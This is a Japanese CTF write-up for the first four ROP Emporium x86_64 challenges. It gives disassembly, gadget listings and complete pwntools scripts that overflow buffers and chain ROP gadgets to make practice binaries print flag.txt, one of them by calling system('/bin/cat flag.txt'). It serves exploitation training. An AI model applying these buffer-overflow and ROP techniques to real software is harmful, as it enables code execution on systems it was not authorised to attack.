---
title: ROP Emporium x86_64 writeup 1/2
date: 2022-10-19
---

CTFのバイナリエクスプロイトで、ROPの練習問題を提供してくれるサイトに[ROP Emporium](https://ropemporium.com/)がある。全部で8問あるうち、前半4問のwriteupを書く。バイナリの種類はいろいろあるがここではx86_64のみを扱う。すべての問題でやることは共通で、脆弱性のあるプログラムのメモリやレジスタの値を書き換えて`flag.txt`の中身を読み込むことになる。

## 環境
- [Parrot OS](https://www.parrotsec.org/) 5.18
- Python 3.9.2
- [Radare2](https://github.com/radareorg/radare2) 5.7.9
- [Ropper](https://github.com/sashs/Ropper) 1.13.8
- [Pwntools](https://github.com/Gallopsled/pwntools) 4.8.0
- [GDB](https://www.sourceware.org/gdb/) 10.1.90.20210103-git
- [Pwndbg](https://github.com/pwndbg/pwndbg) 1.1.1 

## Challenge 1 ret2win

[問題へのリンク](https://ropemporium.com/challenge/ret2win.html)

`main`の中で`pwnme`という関数が呼ばれるので中を覗いてみると`read`関数が呼ばれている箇所がある。引数を見てみると0x20バイト確保している変数`buf`に対して、標準入力から読み込むバイト数が0x38あるのでBuffer Overflow攻撃ができる。

```
[0x004006e8]> pdf
            ; CALL XREF from main @ 0x4006d2(x)
┌ 110: sym.pwnme ();
│           ; var void *buf @ rbp-0x20
│           0x004006e8      55             push rbp
│           0x004006e9      4889e5         mov rbp, rsp
│           0x004006ec      4883ec20       sub rsp, 0x20
│           0x004006f0      488d45e0       lea rax, [buf]
│           0x004006f4      ba20000000     mov edx, 0x20               ; 32 ; size_t n
(...snip...)
│           0x00400733      488d45e0       lea rax, [buf]
│           0x00400737      ba38000000     mov edx, 0x38               ; '8' ; 56 ; size_t nbyte
│           0x0040073c      4889c6         mov rsi, rax                ; void *buf
│           0x0040073f      bf00000000     mov edi, 0                  ; int fildes
│           0x00400744      e847feffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           0x00400749      bf1b094000     mov edi, str.Thank_you_     ; 0x40091b ; "Thank you!" ; const char *s
│           0x0040074e      e8fdfdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00400753      90             nop
│           0x00400754      c9             leave
└           0x00400755      c3             ret
```

シンボル一覧を眺めていると`ret2win`という関数が`flag.txt`の中身を出力してくれる。なのでリターンアドレスを上書きしてこの関数のアドレスに向けてあげればいい。

```
#!/usr/bin/env python3
from pwn import *

FILE = './ret2win'

def exploit():
    # setup
    context.update(arch='amd64', os='linux')
    elf = ELF(FILE)
    conn = process(FILE)

    # making a payload
    payload  = b''
    payload += b'A' * 0x28
    payload += p64(elf.symbols['ret2win'])

    # exploit
    conn.recvuntil(b'>')
    conn.sendline(payload)
    conn.interactive()
    return

if __name__ == '__main__':
    exploit()
```

## Challenge 2 split

[問題へのリンク](https://ropemporium.com/challenge/split.html)

`pwnme`関数にBuffer Overflowの脆弱性があるが、以前のように`flag.txt`の内容を出力してくれる処理がない。`usefulFunction`という関数を見ると中で`system`を呼んでくれているが、第一引数となる`rdi`レジスタの中身は`/bin/ls`なのでここままではファイルの中身を読み出せない。

バイナリを漁ってみると`/bin/cat flag.txt`が書かれたアドレスが見つかるので、`rdi`レジスタの中身をこれに書き換えれば読めるようになる。そのためアセンブリの`pop rdi; ret;`が必要になるのでRopperでガジェットを探す。

```
[0x00400742]> pdf
┌ 17: sym.usefulFunction ();
│           0x00400742      55             push rbp
│           0x00400743      4889e5         mov rbp, rsp
│           0x00400746      bf4a084000     mov edi, str._bin_ls        ; 0x40084a ; "/bin/ls" ; const char *string
│           0x0040074b      e810feffff     call sym.imp.system         ; int system(const char *string)
│           0x00400750      90             nop
│           0x00400751      5d             pop rbp
└           0x00400752      c3             ret
```

```
$rabin2 -z ./split
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium
1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n
2   0x00000806 0x00400806 8   9    .rodata ascii \nExiting
3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user for data...
4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!
5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls
0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt
```

```
$ropper -f ./split
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
(...snip...)
0x00000000004007c3: pop rdi; ret; 
(...snip...)
```

```
#!/usr/bin/env python3

from pwn import *

FILE = './split'

def exploit():
    # setup
    context.update(arch='amd64', os='linux')
    conn = process(FILE)

    # making a payload
    payload  = b''
    payload += b'A' * 0x28
    payload += p64(0x004007c3) # pop rdi; ret
    payload += p64(0x00601060) # '/bin/cat flag.txt'
    payload += p64(0x0040074b) # system

    # exploit
    conn.recvuntil(b'>')
    conn.sendline(payload)
    conn.interactive()
    return

if __name__ == '__main__':
    exploit()
```


## Challenge 3 callme

[問題へのリンク](https://ropemporium.com/challenge/callme.html)

Buffer Overflowの脆弱性とガジェットを利用して先程と同じように問題を解くが、注意書きに以下のことが書いてある。

- `callme_one`、`callme_two`、`callme_three`の順番で関数を呼ぶ
- これらの関数はいずれも3つの引数を取り、64ビットの場合第一引数から順番に`0xdeadbeefdeadbeef`、`0xcafebabecafebabe`、`0xd00df00dd00df00d`を指定する

関数が呼ばれる際、引数は第一から順番に`rdi`、`rsi`、`rdx`の3つのレジスタに格納する必要があるのでRopperでガジェットを探す。

```
$ropper -f ./callme
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
(...snip...)
0x000000000040093c: pop rdi; pop rsi; pop rdx; ret; 
(...snip...)
```


```
#!/usr/bin/env python3

from pwn import *

FILE = './callme'

def exploit():
    context.update(arch='amd64', os='linux')
    elf = ELF(FILE)
    conn = process(FILE)

    # making a payload
    payload  = b''
    payload += b'A' * 0x28
    payload += p64(0x0040093c) # pop rdi; pop rsi; pop rdx; ret;
    payload += p64(0xdeadbeefdeadbeef)
    payload += p64(0xcafebabecafebabe)
    payload += p64(0xd00df00dd00df00d)
    payload += p64(elf.symbols['callme_one'])
    payload += p64(0x0040093c) # pop rdi; pop rsi; pop rdx; ret;
    payload += p64(0xdeadbeefdeadbeef)
    payload += p64(0xcafebabecafebabe)
    payload += p64(0xd00df00dd00df00d)
    payload += p64(elf.symbols['callme_two'])
    payload += p64(0x0040093c) # pop rdi; pop rsi; pop rdx; ret;
    payload += p64(0xdeadbeefdeadbeef)
    payload += p64(0xcafebabecafebabe)
    payload += p64(0xd00df00dd00df00d)
    payload += p64(elf.symbols['callme_three'])

    # exploit
    conn.recvuntil(b'>')
    conn.sendline(payload)
    conn.interactive()
    return

if __name__ == '__main__':
    exploit()
```

# Challenge 4 write4

[問題へのリンク](https://ropemporium.com/challenge/write4.html)

これまで単一のバイナリが問題になっていた。しかし今回は問題のバイナリである`write4`に加えて`libwrite4.so`という共有ライブラリが付属している。

`pwnme`関数にはBuffer Overflowの脆弱性があるので攻撃の起点はここになる。また、`print_file`関数は、第一引数に指定した文字列のポインタを使ってファイルの内容を出力してくれる。ただ、バイナリを探しても`flag.txt`の文字は無いので一度どこかに`flag.txt`の文字を書き込んでからそのアドレスを引数として渡す必要がある。

Ropperでガジェットを探すと`mov qword ptr [r14], r15; ret;`という命令がある。これは`r14`レジスタ内の値をアドレスと解釈してその場所に`r15`レジスタの中身を書くというものなので書き込みに利用できる。

書き込む場所を探そうとするも共有ライブラリの`libwrite4.so`はPIEが有効になっているので実行ファイルが置かれるアドレスを特定することができない。なので`write4`にある`.bss`セクションを利用する。

```
$rabin2 -S ./write4
[Sections]

nth paddr        size vaddr       vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――
(...snip...)
24  0x00001038    0x0 0x00601038    0x8 -rw- .bss
(...snip...)
```

```
$ropper -f ./write4
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
(...snip...)
0x0000000000400628: mov qword ptr [r14], r15; ret; 
(...snip...)
0x0000000000400690: pop r14; pop r15; ret; 
(...snip...)
0x0000000000400693: pop rdi; ret; 
(...snip...)
```

```
#!/usr/bin/env python3
from pwn import *

FILE = './write4'

def exploit():
    # setup
    context.update(arch='amd64', os='linux')
    elf = ELF(FILE)
    conn = process(FILE)

    # making a payload
    flag = b'flag.txt'
    addr_bss = p64(0x00601038)
    
    payload  = b'A' * 0x28
    payload += p64(0x00400690) # pop r14; pop r15; ret;
    payload += addr_bss
    payload += flag
    payload += p64(0x00400628) # mov qword ptr [r14], r15; ret;
    payload += p64(0x00400693) # pop rdi; ret;
    payload += addr_bss
    payload += p64(elf.plt['print_file'])

    # exploit
    conn.recvuntil(b'>')
    conn.sendline(payload)
    conn.interactive()
    return

if __name__ == '__main__':
    exploit()
```
